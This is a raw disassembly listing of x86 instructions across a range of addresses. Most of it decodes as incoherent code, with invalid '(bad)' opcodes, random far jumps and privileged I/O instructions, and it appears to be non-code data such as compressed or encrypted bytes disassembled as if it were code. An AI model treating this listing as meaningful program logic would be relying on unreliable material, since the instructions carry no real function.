  42bcf2:	faddp  st(3),st
  42bcf4:	int    0xf3
  42bcf6:	pop    esi
  42bcf7:	std    
  42bcf8:	mov    eax,ds:0xb57c83fc
  42bcfd:	dec    edx
  42bcfe:	push   esp
  42bcff:	int    0x1d
  42bd01:	mov    ch,BYTE PTR [ebp+0x40]
  42bd04:	outs   dx,BYTE PTR ds:[esi]
  42bd05:	ret    
  42bd06:	jbe    0x42bc91
  42bd08:	mov    ecx,cs
  42bd0a:	pop    ds
  42bd0b:	shl    ch,1
  42bd0d:	push   es
  42bd0e:	jmp    0x0:0xe0
	...
  42bd71:	add    BYTE PTR [eax],al
  42bd73:	add    BYTE PTR [eax-0x61eb634a],dh
  42bd79:	ds mov eax,0xffec3b6
  42bd7f:	jae    0x42bd3e
  42bd81:	mov    dl,0xb8
  42bd83:	data16 fcom st(4)
  42bd86:	add    DWORD PTR [eax],eax
  42bd88:	add    al,0x1
  42bd8a:	add    BYTE PTR [eax],al
  42bd8c:	adc    BYTE PTR [esi],ch
  42bd8e:	iret   
  42bd8f:	inc    edx
  42bd90:	mov    dl,0x7d
  42bd92:	or     eax,DWORD PTR [ecx+edx*8-0x7e0946f9]
  42bd99:	into   
  42bd9a:	iret   
  42bd9b:	or     eax,0x5e25f17f
  42bda0:	mov    bl,0xaf
  42bda2:	or     al,0x11
  42bda4:	cli    
  42bda5:	xor    ebx,ebx
  42bda7:	dec    ecx
  42bda8:	outs   dx,BYTE PTR ds:[esi]
  42bda9:	leave  
  42bdaa:	and    DWORD PTR [eax-0x57],esp
  42bdad:	cs aaa 
  42bdaf:	rol    DWORD PTR [edi+0x3],cl
  42bdb2:	das    
  42bdb3:	hlt    
  42bdb4:	hlt    
  42bdb5:	repz test al,0xc8
  42bdb8:	lods   al,BYTE PTR ds:[esi]
  42bdb9:	dec    ebx
  42bdba:	or     DWORD PTR [ebx-0x47],edi
  42bdbd:	xchg   edx,eax
  42bdbe:	fimul  WORD PTR [ebx-0x59]
  42bdc1:	sub    DWORD PTR [edx],edi
  42bdc3:	adc    ah,bl
  42bdc5:	scas   al,BYTE PTR es:[edi]
  42bdc6:	or     ebp,DWORD PTR [ecx-0x2d]
  42bdc9:	add    eax,DWORD PTR [ecx+0x4b5b1248]
  42bdcf:	push   ss
  42bdd0:	mov    WORD PTR [ebx],cs
  42bdd2:	loopne 0x42bd94
  42bdd4:	xchg   ebp,eax
  42bdd5:	sahf   
  42bdd6:	cli    
  42bdd7:	pop    eax
  42bdd8:	pushf  
  42bdd9:	mov    ds:0xe925a14,eax
  42bdde:	mov    esp,0x9777e8c5
  42bde3:	repnz stc 
  42bde5:	jnp    0x42be45
  42bde7:	inc    esp
  42bde8:	pop    ebx
  42bde9:	sbb    esp,DWORD PTR [ecx+0x653a2fed]
  42bdef:	(bad)  
  42bdf0:	jmp    0x42bd9d
  42bdf2:	cmp    BYTE PTR ds:0x22414dea,ch
  42bdf8:	and    ebx,DWORD PTR [ebx+0x4a]
  42bdfb:	je     0x42be6d
  42bdfd:	cmp    al,0x73
  42bdff:	jge    0x42be7d
  42be01:	sahf   
  42be02:	jae    0x42be75
  42be04:	div    DWORD PTR [eax+0x29aeb19c]
  42be0a:	sbb    eax,0x70cc0f6f
  42be0f:	(bad)  
  42be11:	fcomi  st,st(7)
  42be13:	dec    esi
  42be14:	ret    
  42be15:	or     al,0xda
  42be17:	push   es
  42be18:	inc    edi
  42be19:	dec    ecx
  42be1a:	pop    ss
  42be1b:	fdivr  DWORD PTR [esi]
  42be1e:	cmp    al,BYTE PTR [esi+eax*1+0x6b]
  42be22:	xor    DWORD PTR [esi-0x44],eax
  42be25:	dec    esi
  42be26:	fstp   DWORD PTR [ecx-0x76]
  42be29:	add    eax,0x5808b46a
  42be2e:	(bad)  
  42be2f:	sbb    edi,DWORD PTR [esi]
  42be31:	jbe    0x42be0e
  42be33:	ret    
  42be34:	push   eax
  42be35:	(bad)  
  42be36:	stc    
  42be37:	shl    BYTE PTR [edi-0x4a87ac8d],0x4a
  42be3e:	xchg   ebx,eax
  42be3f:	cmp    DWORD PTR [eax+esi*8-0x1],0xdd4ff0b6
  42be47:	ror    BYTE PTR [esi+0x710e8713],cl
  42be4d:	inc    esp
  42be4e:	adc    eax,0x26818b3
  42be53:	das    
  42be54:	aas    
  42be55:	jbe    0x42be07
  42be57:	shr    DWORD PTR [edx],0xe0
  42be5a:	pop    ds
  42be5b:	mov    ecx,0x2afad6d6
  42be60:	mov    ah,ch
  42be62:	push   0x2dab4f75
  42be67:	inc    esi
  42be68:	inc    esp
  42be69:	daa    
  42be6a:	xchg   ebx,eax
  42be6b:	in     eax,0x3d
  42be6d:	push   0xa60f449e
  42be72:	mov    dl,BYTE PTR [edx-0x13]
  42be75:	xlat   BYTE PTR ds:[ebx]
  42be76:	sub    eax,0x39fa072b
  42be7b:	cmp    ebp,DWORD PTR [esi+0x4c]
  42be7e:	lods   eax,DWORD PTR ds:[esi]
  42be7f:	mov    esp,0xdd31033e
  42be84:	adc    DWORD PTR [ecx-0x74],ecx
  42be87:	sub    eax,0x21d72043
  42be8c:	(bad)  
  42be8e:	xor    al,0x7a
	...
  42bef4:	xchg   edi,eax
  42bef5:	and    BYTE PTR [edi-0x26],al
  42bef8:	idiv   edi
  42befa:	lahf   
  42befb:	ins    DWORD PTR es:[edi],dx
  42befc:	mov    ds:0xaf7bd7c8,eax
  42bf01:	aaa    
  42bf02:	ja     0x42beb4
  42bf04:	(bad)  
  42bf06:	add    DWORD PTR [eax],eax
  42bf08:	add    al,0x1
  42bf0a:	add    BYTE PTR [eax],al
  42bf0c:	xchg   ebx,eax
  42bf0d:	jmp    0x42bf10
  42bf0f:	dec    ebx
  42bf10:	sbb    BYTE PTR ds:0x674d3926,cl
  42bf16:	inc    ebp
  42bf17:	xor    BYTE PTR [ecx-0x58],0xde
  42bf1b:	cdq    
  42bf1c:	pop    es
  42bf1d:	xor    dh,BYTE PTR [ebx-0x44]
  42bf20:	jp     0x42bf5f
  42bf22:	loop   0x42beb2
  42bf24:	jecxz  0x42bf67
  42bf26:	mov    edx,0xa861b36f
  42bf2b:	sub    DWORD PTR [edi],ebp
  42bf2d:	sbb    ebx,DWORD PTR [ecx]
  42bf2f:	stc    
  42bf30:	stos   DWORD PTR es:[edi],eax
  42bf31:	sub    eax,0x868c2d8a
  42bf36:	and    esi,DWORD PTR [ebp-0x6f234a84]
  42bf3c:	shl    DWORD PTR [ebx+0x7d],1
  42bf3f:	lods   eax,DWORD PTR ds:[esi]
  42bf40:	inc    ecx
  42bf41:	loope  0x42bf6d
  42bf43:	int3   
  42bf44:	in     al,0xea
  42bf46:	jae    0x42bf76
  42bf48:	stc    
  42bf49:	div    BYTE PTR [edi+0x23]
  42bf4c:	sub    BYTE PTR [ebx-0x5b],0xa1
  42bf50:	xor    BYTE PTR [eax-0x5a],ah
  42bf53:	int    0x5e
  42bf55:	xchg   edx,eax
  42bf56:	retf   
  42bf57:	sbb    BYTE PTR [esi-0x73507138],ch
  42bf5d:	test   DWORD PTR [ecx+esi*1+0x6118351a],ebx
  42bf64:	loop   0x42bf0a
  42bf66:	inc    edi
  42bf67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf68:	scas   al,BYTE PTR es:[edi]
  42bf69:	shr    BYTE PTR [ecx-0x1ca96828],cl
  42bf6f:	scas   eax,DWORD PTR es:[edi]
  42bf70:	ja     0x42bf2b
  42bf72:	fsubr  DWORD PTR [eax-0x3fb6f3f7]
  42bf78:	aas    
  42bf79:	in     al,0x86
  42bf7b:	jae    0x42bfea
  42bf7d:	loopne 0x42bfcc
  42bf7f:	mov    ebx,0xefa2b2ca
  42bf84:	or     edi,DWORD PTR [edx+0x6b66ab4b]
  42bf8a:	aad    0xab
  42bf8c:	mov    esp,0x3843c227
  42bf91:	fild   QWORD PTR [eax]
  42bf93:	sub    ebx,DWORD PTR [eax+ecx*8]
  42bf96:	adc    ecx,edx
  42bf98:	test   eax,0x20fb7cde
  42bf9d:	push   esp
  42bf9e:	cmp    ebp,ebx
  42bfa0:	push   es
  42bfa1:	add    DWORD PTR [esi],0x1e
  42bfa4:	inc    ecx
  42bfa5:	call   0x1588073a
  42bfaa:	xlat   BYTE PTR ds:[ebx]
  42bfab:	and    DWORD PTR [ecx+0x12e42b08],edx
  42bfb1:	retf   
  42bfb2:	inc    ebx
  42bfb3:	mov    dh,0x87
  42bfb5:	pop    ebp
  42bfb6:	clc    
  42bfb7:	jno    0x42c005
  42bfb9:	ja     0x42bfae
  42bfbb:	retf   0x74ee
  42bfbe:	fiadd  WORD PTR [ebp-0x11]
  42bfc1:	icebp  
  42bfc2:	ror    eax,0xeb
  42bfc5:	lahf   
  42bfc6:	call   0xe440:0x5db5004c
  42bfcd:	cli    
  42bfce:	shl    DWORD PTR [esi],cl
  42bfd0:	mov    dh,0xa5
  42bfd2:	ss inc edx
  42bfd4:	jp     0x42c053
  42bfd6:	lds    ebx,FWORD PTR [ecx+0x137b8dc]
  42bfdc:	call   0x882b:0x701da70b
  42bfe3:	inc    edx
  42bfe4:	imul   esi,edx,0xffffffb9
  42bfe7:	pop    ds
  42bfe8:	mov    ebp,0xb7890c22
  42bfed:	loopne 0x42bfe9
  42bfef:	mov    ch,0x6b
  42bff1:	aas    
  42bff2:	enter  0xbb84,0xb8
  42bff6:	jbe    0x42c05a
  42bff8:	sbb    BYTE PTR [edi+eax*1+0x19],al
  42bffc:	push   ecx
  42bffd:	or     DWORD PTR es:[esi],ebx
  42c000:	mov    eax,0xfb3cdc3
  42c005:	push   es
  42c006:	retf   0xd076
  42c009:	or     DWORD PTR ds:0x75c3dc39,ecx
  42c00f:	mov    al,ds:0x0
	...
  42c074:	cmp    dl,BYTE PTR [edx-0x800cd89]
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	outs   dx,BYTE PTR ds:[esi]
  42c081:	or     eax,DWORD PTR [esi+0x1d6e0b7]
  42c087:	add    BYTE PTR [ecx+eax*1],al
  42c08a:	add    BYTE PTR [eax],al
  42c08c:	push   0xb0c51f6d
  42c091:	addr16 pop ss
  42c093:	mov    dh,0x8b
  42c095:	pop    eax
  42c096:	and    DWORD PTR [esi-0x3fc1855c],esp
  42c09c:	push   ss
  42c09d:	sbb    bl,cl
  42c09f:	call   0xdb9a91e2
  42c0a4:	jne    0x42c026
  42c0a6:	push   ds
  42c0a7:	add    DWORD PTR [edi-0x17853c9b],eax
  42c0ad:	mov    esi,0x7d825dbb
  42c0b2:	aad    0x24
  42c0b4:	xlat   BYTE PTR ds:[ebx]
  42c0b5:	into   
  42c0b6:	jl     0x42c0bc
  42c0b8:	rol    DWORD PTR [ebp-0x13f12d0e],1
  42c0be:	fnsave [esi+esi*2-0x23ab6636]
  42c0c5:	inc    edx
  42c0c6:	sbb    bl,dl
  42c0c8:	aas    
  42c0c9:	in     al,0x27
  42c0cb:	sbb    BYTE PTR [esp+eax*1],bl
  42c0ce:	sub    esi,DWORD PTR [edx+edi*4+0x46]
  42c0d2:	push   ss
  42c0d3:	jbe    0x42c14a
  42c0d5:	dec    esp
  42c0d6:	mov    bh,0xce
  42c0d8:	mov    bh,BYTE PTR ds:0x84d19918
  42c0de:	mov    al,0x5
  42c0e0:	ficomp WORD PTR [ebx+esi*4-0x75088b3d]
  42c0e7:	in     eax,0xa1
  42c0e9:	in     eax,dx
  42c0ea:	mov    edi,0x8b5280d8
  42c0ef:	out    dx,eax
  42c0f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c0f1:	push   cs
  42c0f2:	test   eax,0xbf037450
  42c0f7:	pop    ebx
  42c0f8:	pop    esp
  42c0f9:	sub    BYTE PTR [eax+0x6c],al
  42c0fc:	mov    al,ds:0xbc1c09ed
  42c101:	mov    DWORD PTR [eax-0x65889fd3],ebx
  42c107:	(bad)  
  42c108:	imul   esi,DWORD PTR [edi-0x3c],0x54
  42c10c:	xor    BYTE PTR [edx+ecx*2-0x76930995],bh
  42c113:	fcmovu st,st(0)
  42c115:	sar    DWORD PTR [ecx],cl
  42c117:	push   0xffffffc6
  42c119:	ret    0xc9fa
  42c11c:	inc    ecx
  42c11d:	mov    ch,BYTE PTR [edi]
  42c11f:	inc    esi
  42c120:	jmp    0x5662bda6
  42c125:	mov    WORD PTR [esi+ebp*2-0x1b],fs
  42c129:	mov    edi,0xb5288ec9
  42c12e:	out    dx,al
  42c12f:	outs   dx,BYTE PTR ds:[esi]
  42c130:	jl     0x42c155
  42c132:	in     eax,0x69
  42c134:	(bad)  
  42c135:	sub    al,BYTE PTR [edx+0x33]
  42c138:	or     BYTE PTR [esi],al
  42c13a:	out    dx,al
  42c13b:	loopne 0x42c165
  42c13d:	mov    edi,0xdde7b546
  42c142:	retf   0x711c
  42c145:	dec    eax
  42c146:	and    ebp,DWORD PTR [ecx-0x7f]
  42c149:	fisubr WORD PTR [edx]
  42c14b:	and    esi,DWORD PTR [edx+esi*8+0x386bf95d]
  42c152:	jp     0x42c0e8
  42c154:	ror    DWORD PTR [ecx],1
  42c156:	inc    eax
  42c157:	xchg   edi,eax
  42c158:	fcos   
  42c15a:	push   0xc2057868
  42c15f:	retf   0x433f
  42c162:	sub    BYTE PTR [ecx],0x2f
  42c165:	jmp    0x86fd:0xc26ebf76
  42c16c:	aas    
  42c16d:	aam    0x13
  42c16f:	and    dh,dh
  42c171:	push   ebx
  42c172:	inc    esi
  42c173:	jno    0x42c15a
  42c175:	mov    ch,0x63
  42c177:	in     eax,dx
  42c178:	in     eax,dx
  42c179:	fcomp  QWORD PTR [ebx]
  42c17b:	sbb    cl,BYTE PTR [ebp-0x7f]
  42c17e:	cld    
  42c17f:	and    DWORD PTR [edi-0x4ca9e513],0x8d3657bd
  42c189:	js     0x42c1af
  42c18b:	adc    edx,DWORD PTR ss:[ebp-0x1d]
  42c18f:	cli    
	...
  42c1f4:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	mov    esp,?
  42c202:	enter  0xe41e,0xd7
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    al,0x1
  42c20a:	add    BYTE PTR [eax],al
  42c20c:	and    DWORD PTR [ecx],edx
  42c20e:	mov    dl,0x5c
  42c210:	dec    ebp
  42c211:	mov    al,ds:0x5609979f
  42c216:	fdiv   DWORD PTR [ecx]
  42c218:	mov    ecx,0x5212adb6
  42c21d:	mov    ecx,0x341ebdf0
  42c222:	rol    BYTE PTR [esi+ebx*1],1
  42c225:	sbb    DWORD PTR [esi+0x5445534c],eax
  42c22b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c22c:	cs in  al,dx
  42c22e:	lods   al,BYTE PTR ds:[esi]
  42c22f:	push   ds
  42c230:	je     0x42c2af
  42c232:	inc    edx
  42c233:	imul   ebx,DWORD PTR [esi],0xffffff88
  42c236:	int3   
  42c237:	cwde   
  42c238:	jp     0x42c2a3
  42c23a:	std    
  42c23b:	mov    ebx,0xcd39fd4c
  42c240:	cmp    al,0x75
  42c242:	test   DWORD PTR [eax],0x6345f61e
  42c248:	cmp    ecx,DWORD PTR [eax]
  42c24a:	add    bl,dh
  42c24c:	sbb    eax,0x4a1231a4
  42c251:	rcl    BYTE PTR [eax],1
  42c253:	dec    esp
  42c254:	dec    esp
  42c255:	test   DWORD PTR [esi+0x4a],0x8c466f7c
  42c25c:	push   ecx
  42c25d:	ret    0xc6f0
  42c260:	pop    edi
  42c261:	add    esp,DWORD PTR [edi+0x6d]
  42c264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c265:	hlt    
  42c266:	repnz pop ebx
  42c268:	scas   al,BYTE PTR es:[edi]
  42c269:	rol    DWORD PTR [ecx+0x1503e1d9],0x10
  42c270:	movd   DWORD PTR [ecx+0x38cc12da],mm4
  42c277:	es or  eax,0xbf08f329
  42c27d:	jo     0x42c24e
  42c27f:	scas   al,BYTE PTR es:[edi]
  42c280:	ror    DWORD PTR [ecx-0x45],cl
  42c283:	mov    edx,0xeb73c836
  42c288:	xor    eax,0xebe474a2
  42c28d:	imul   ebp,DWORD PTR [ebx],0xcbcffbe2
  42c293:	push   cs
  42c294:	and    eax,0x8c6d7698
  42c299:	xor    al,0xb7
  42c29b:	dec    esp
  42c29c:	mov    ah,0xb2
  42c29e:	sti    
  42c29f:	push   ecx
  42c2a0:	xchg   BYTE PTR [eax+0x51],dh
  42c2a3:	jo     0x42c22b
  42c2a5:	jno    0x42c2d3
  42c2a7:	(bad)  
  42c2a8:	in     eax,0xbb
  42c2aa:	test   DWORD PTR [ebp-0x3b944eb],0xe3503766
  42c2b4:	icebp  
  42c2b5:	stos   BYTE PTR es:[edi],al
  42c2b6:	in     eax,dx
  42c2b7:	push   eax
  42c2b8:	jb     0x42c303
  42c2ba:	ss mov ah,0x3b
  42c2bd:	pop    es
  42c2be:	stc    
  42c2bf:	aad    0x3
  42c2c1:	push   ebx
  42c2c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2c3:	mov    ds:0x184cca63,eax
  42c2c8:	xor    bh,ah
  42c2ca:	out    0x40,al
  42c2cc:	stos   DWORD PTR es:[edi],eax
  42c2cd:	ss push edi
  42c2cf:	push   ebp
  42c2d0:	in     al,dx
  42c2d1:	pusha  
  42c2d2:	mov    ds:0xa41f87ea,al
  42c2d7:	mov    bl,0x66
  42c2d9:	add    eax,0x69784265
  42c2de:	and    eax,0xfa196e8e
  42c2e3:	pop    eax
  42c2e4:	test   BYTE PTR [ebp+0x6b],0x12
  42c2e8:	xchg   edx,eax
  42c2e9:	mov    DWORD PTR [esi+0x41],0xfd462565
  42c2f0:	dec    eax
  42c2f1:	sbb    eax,0x76b36c30
  42c2f6:	stos   DWORD PTR es:[edi],eax
  42c2f7:	outs   dx,BYTE PTR ds:[esi]
  42c2f8:	sti    
  42c2f9:	fnstsw WORD PTR cs:[ebx]
  42c2fc:	lods   al,BYTE PTR ds:[esi]
  42c2fd:	inc    ebp
  42c2fe:	xchg   BYTE PTR [ecx-0xb],bl
  42c301:	mul    cl
  42c303:	les    edi,FWORD PTR [esi+0x910a93a]
  42c309:	cli    
  42c30a:	jmp    0x89ea8a97
  42c30f:	add    DWORD PTR [eax],eax
	...
  42c371:	add    BYTE PTR [eax],al
  42c373:	add    dh,ah
  42c375:	psubusw mm5,QWORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xd84c89f6
  42c383:	dec    edi
  42c384:	call   0x442c561
  42c389:	add    DWORD PTR [eax],eax
  42c38b:	add    BYTE PTR [esp-0x3e],dh
  42c38f:	aas    
  42c390:	sbb    bl,BYTE PTR [ebp+esi*1-0x69]
  42c394:	dec    edi
  42c395:	xchg   ebp,eax
  42c396:	or     al,0x75
  42c398:	sub    ebp,DWORD PTR [esp+ecx*4]
  42c39b:	cmp    al,0x53
  42c39d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c39e:	sub    ecx,DWORD PTR [esi+0x65d2024e]
  42c3a4:	xor    al,0x44
  42c3a6:	mov    ebp,0x9ee3b22e
  42c3ab:	pusha  
  42c3ac:	arpl   WORD PTR [edx-0x26a3a181],dx
  42c3b2:	dec    eax
  42c3b3:	(bad)  
  42c3b4:	dec    esp
  42c3b5:	add    bl,BYTE PTR [ecx]
  42c3b7:	jg     0x42c3c5
  42c3b9:	push   0xfffffffd
  42c3bb:	aaa    
  42c3bc:	and    DWORD PTR [esi],eax
  42c3be:	dec    esp
  42c3bf:	pop    esp
  42c3c0:	call   0xd04a:0x90d9fa51
  42c3c7:	in     eax,dx
  42c3c8:	and    al,0x4a
  42c3ca:	loop   0x42c37a
  42c3cc:	dec    esp
  42c3cd:	or     esi,DWORD PTR [eax]
  42c3cf:	(bad)  
  42c3d0:	ret    
  42c3d1:	cld    
  42c3d2:	inc    edx
  42c3d3:	lods   eax,DWORD PTR ds:[esi]
  42c3d4:	jl     0x42c3c9
  42c3d6:	sub    DWORD PTR [esi-0x19e77605],0x6c
  42c3dd:	pop    edi
  42c3de:	xor    al,0x3d
  42c3e0:	xchg   ebp,eax
  42c3e1:	hlt    
  42c3e2:	cwde   
  42c3e3:	pop    ds
  42c3e4:	xchg   esi,eax
  42c3e5:	gs call 0xc8fb2e45
  42c3eb:	mov    esi,0x725252b5
  42c3f0:	cmp    BYTE PTR [eax+0x6c],0xf6
  42c3f4:	xor    ah,BYTE PTR [eax+0x31a9bca0]
  42c3fa:	pop    edx
  42c3fb:	xchg   ecx,eax
  42c3fc:	sbb    ebp,DWORD PTR [edx+eax*1+0x39]
  42c400:	and    edi,eax
  42c402:	in     al,0x9
  42c404:	xor    al,0xde
  42c406:	push   ebp
  42c407:	ret    
  42c408:	fldcw  WORD PTR [ecx+0x6193def]
  42c40e:	fwait
  42c40f:	mov    BYTE PTR [ebp-0xe6aab63],dh
  42c415:	push   edi
  42c416:	xor    BYTE PTR [ebx+0x30],ah
  42c419:	fist   DWORD PTR [ebx-0x6d]
  42c41c:	mov    al,ds:0x97270fc5
  42c421:	lahf   
  42c422:	repz enter 0x7168,0x41
  42c427:	loope  0x42c43c
  42c429:	aaa    
  42c42a:	push   ecx
  42c42b:	mov    esp,db1
  42c42e:	and    ah,ch
  42c430:	jge    0x42c3f4
  42c432:	out    dx,al
  42c433:	inc    esp
  42c434:	addr16 push es
  42c436:	sbb    DWORD PTR [ebp+0x1c7a34f],edi
  42c43c:	rcr    BYTE PTR [esi],cl
  42c43e:	rcl    esi,cl
  42c440:	in     al,dx
  42c441:	icebp  
  42c442:	cmp    eax,0xc4729c2
  42c447:	adc    ah,BYTE PTR [ebp+0x38c2db5c]
  42c44d:	gs push es
  42c44f:	in     al,dx
  42c450:	mov    bh,0xbf
  42c452:	jp     0x42c498
  42c454:	jl     0x42c4c7
  42c456:	jbe    0x42c424
  42c458:	clc    
  42c459:	mov    dh,0xbb
  42c45b:	sbb    BYTE PTR [ebx+0x65],ah
  42c45e:	add    dh,cl
  42c460:	or     esp,DWORD PTR [edi+0x2e]
  42c463:	mov    ecx,0x50a4694f
  42c468:	ds pop ebx
  42c46a:	push   ds
  42c46b:	(bad)  [eax]
  42c46d:	pop    ebp
  42c46e:	int    0x9a
  42c470:	xchg   esi,eax
  42c471:	scas   eax,DWORD PTR es:[edi]
  42c472:	stos   BYTE PTR es:[edi],al
  42c473:	dec    ebx
  42c474:	xchg   BYTE PTR [ebp-0x580ac269],ch
  42c47a:	add    edx,DWORD PTR [edx+edx*1-0x4156bfc]
  42c481:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c482:	sbb    eax,0xb9419fed
  42c487:	repz gs push ss
  42c48a:	sub    esp,DWORD PTR [ebp+0x3eec9cd1]
	...
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x3734,0x11
  42c502:	pop    edi
  42c503:	scas   al,BYTE PTR es:[edi]
  42c504:	in     al,dx
  42c505:	fld    DWORD PTR [ecx]
  42c507:	add    BYTE PTR [ecx+eax*1],al
  42c50a:	add    BYTE PTR [eax],al
  42c50c:	dec    edi
  42c50e:	add    DWORD PTR [eax],edi
  42c510:	and    BYTE PTR [edi-0x73],bh
  42c513:	clc    
  42c514:	sub    cl,BYTE PTR [ebx-0x4d]
  42c517:	xchg   esp,eax
  42c518:	out    0xc5,eax
  42c51a:	sub    al,0xab
  42c51d:	mov    ebx,0x504ca2d9
  42c522:	ret    
  42c523:	out    dx,al
  42c524:	addr16 int3 
  42c526:	jmp    0xd2e1:0xa29a07cc
  42c52d:	test   DWORD PTR [eax],0x85726cc1
  42c533:	pop    ecx
  42c534:	loop   0x42c519
  42c536:	jg     0x42c562
  42c538:	ins    DWORD PTR es:[edi],dx
  42c539:	mov    ds:0x6dd683b0,eax
  42c53e:	(bad)  
  42c53f:	in     eax,0xb3
  42c541:	shr    DWORD PTR ds:0x3d95aed0,1
  42c547:	sar    DWORD PTR [ebx+0x57],cl
  42c54a:	int3   
  42c54b:	sub    al,0x16
  42c54d:	aad    0x3e
  42c54f:	or     ch,dh
  42c551:	xchg   ebx,eax
  42c552:	retf   0xe179
  42c555:	ss ss xor al,0x26
  42c559:	fsubr  QWORD PTR [esi+ebp*4]
  42c55c:	mov    bl,0xba
  42c55e:	outs   dx,BYTE PTR ds:[esi]
  42c55f:	cld    
  42c560:	jmp    0x2fcd:0x2b363d9a
  42c567:	sub    DWORD PTR [ecx+edx*8+0x76461449],ecx
  42c56e:	sub    DWORD PTR [ebx-0x2587db8a],ecx
  42c574:	mov    dl,0x10
  42c576:	pop    ebx
  42c577:	mov    edx,?
  42c579:	jns    0x42c5b6
  42c57b:	les    ebx,FWORD PTR [ebx+0x181c384e]
  42c581:	out    0x6f,al
  42c583:	pop    ecx
  42c584:	nop
  42c585:	push   ebp
  42c586:	bound  edx,QWORD PTR [ebp+0xf]
  42c589:	inc    edx
  42c58a:	mov    ebx,0x8d605cd1
  42c58f:	ins    BYTE PTR es:[edi],dx
  42c590:	push   ecx
  42c591:	lods   eax,DWORD PTR ds:[esi]
  42c592:	loopne 0x42c5c3
  42c594:	(bad)  
  42c595:	in     eax,dx
  42c596:	je     0x42c57a
  42c598:	push   edx
  42c599:	pop    edi
  42c59a:	(bad)  
  42c59b:	xchg   edx,eax
  42c59c:	hlt    
  42c59d:	inc    eax
  42c59e:	in     al,dx
  42c59f:	adc    eax,DWORD PTR [ebp+0x48]
  42c5a2:	jl     0x42c605
  42c5a4:	xor    dl,BYTE PTR [ecx]
  42c5a6:	xchg   esp,eax
  42c5a7:	or     BYTE PTR [esi-0x5b],al
  42c5aa:	push   edi
  42c5ab:	lea    esi,[esi+0x30d38992]
  42c5b1:	js     0x42c56d
  42c5b3:	jne    0x42c5ae
  42c5b5:	(bad)  
  42c5b6:	mov    bl,0xae
  42c5b8:	ret    
  42c5b9:	data16 shl BYTE PTR [ebp-0x73abafbe],cl
  42c5c0:	xchg   esp,eax
  42c5c1:	push   0x45
  42c5c3:	push   ebx
  42c5c4:	mov    bh,BYTE PTR [ecx]
  42c5c6:	fwait
  42c5c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c5c8:	test   BYTE PTR [ebx+0x34356b8d],bh
  42c5ce:	je     0x42c5ce
  42c5d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c5d1:	inc    edx
  42c5d2:	pop    ds
  42c5d3:	xor    BYTE PTR ds:0xee664b5e,cl
  42c5d9:	leave  
  42c5da:	jl     0x42c5e8
  42c5dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c5dd:	das    
  42c5de:	std    
  42c5df:	pop    ds
  42c5e0:	pop    ds
  42c5e1:	lods   eax,DWORD PTR ds:[esi]
  42c5e2:	shr    DWORD PTR [esi-0x69b98e0a],1
  42c5e8:	ins    BYTE PTR es:[edi],dx
  42c5e9:	inc    eax
  42c5ea:	nop    DWORD PTR [ecx]
  42c5ed:	pop    es
  42c5ee:	fwait
  42c5ef:	hlt    
  42c5f0:	push   es
  42c5f1:	idiv   DWORD PTR [esi-0x34]
  42c5f4:	xchg   BYTE PTR [ebx-0x52abc8b9],al
  42c5fa:	dec    edx
  42c5fb:	mov    eax,ds:0x71970dea
  42c600:	sub    eax,0xf427cdf7
  42c605:	daa    
  42c606:	ret    
  42c607:	lahf   
  42c608:	test   DWORD PTR [esi-0x5a18059e],esp
  42c60e:	jnp    0x42c68f
	...
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0x446dfc6b]
  42c681:	cld    
  42c682:	jle    0x42c60a
  42c684:	lock fiadd DWORD PTR [ecx]
  42c687:	add    BYTE PTR [ecx+eax*1],al
  42c68a:	add    BYTE PTR [eax],al
  42c68c:	sbb    ecx,DWORD PTR [edi+ebx*1-0x39]
  42c690:	loopne 0x42c620
  42c692:	call   0x3aab0fda
  42c697:	jl     0x42c621
  42c699:	xchg   edx,eax
  42c69a:	in     eax,0x91
  42c69c:	jle    0x42c638
  42c69e:	pusha  
  42c69f:	out    0x36,eax
  42c6a1:	sub    edx,DWORD PTR [ebp-0x3e1aabc]
  42c6a7:	push   0xe46dec75
  42c6ac:	jmp    0x1c46:0xcb072390
  42c6b3:	add    BYTE PTR ds:0x67f1f3de,0xbc
  42c6ba:	dec    eax
  42c6bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6bc:	dec    edx
  42c6bd:	cmp    BYTE PTR [ebx+ebp*8+0x2a],0x7c
  42c6c2:	sub    DWORD PTR [esi],edi
  42c6c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6c5:	ins    DWORD PTR es:[edi],dx
  42c6c6:	fdivrp st(5),st
  42c6c8:	mov    dl,0x27
  42c6ca:	mov    dh,BYTE PTR [ecx+edx*8-0x1a]
  42c6ce:	data16 fwait
  42c6d0:	push   ss
  42c6d1:	lea    ebx,[eax+ebp*8]
  42c6d4:	iret   
  42c6d5:	outs   dx,BYTE PTR ds:[esi]
  42c6d6:	sbb    ecx,DWORD PTR [edx-0x3c826d0a]
  42c6dc:	daa    
  42c6dd:	mov    ecx,0x5ce3e91d
  42c6e2:	loope  0x42c712
  42c6e4:	add    BYTE PTR ds:0x9474dbff,ch
